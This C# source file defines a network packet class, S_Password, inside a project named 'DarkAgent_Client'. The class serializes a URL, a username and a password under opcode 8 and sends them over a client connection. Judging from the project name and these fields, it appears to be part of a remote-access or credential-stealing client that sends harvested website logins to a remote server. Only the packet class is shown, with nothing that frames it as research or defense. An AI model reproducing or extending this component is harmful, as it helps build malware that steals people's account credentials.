using System;
using System.Collections.Generic;
using System.Text;

namespace DarkAgent_Client.src.Network.DataNetwork.Packets.Send
{
    class S_Password : SendBasePacket
    {
        string URL;
        string Username;
        string Password;
        public S_Password(ClientConnect client, string URL, string Username, string Password)
            : base(client)
        {
            this.URL = URL;
            this.Username = Username;
            this.Password = Password;
        }

        protected internal override void Write()
        {
            WriteByte(8);
            WriteString(URL);
            WriteString(Username);
            WriteString(Password);
        }
    }
}
